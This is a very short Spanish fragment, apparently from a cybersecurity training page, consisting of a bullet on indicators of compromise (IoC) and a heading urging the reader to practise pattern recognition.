- Indicadores de compromiso (IoC)

**¡Practica el reconocimiento de patrones!**
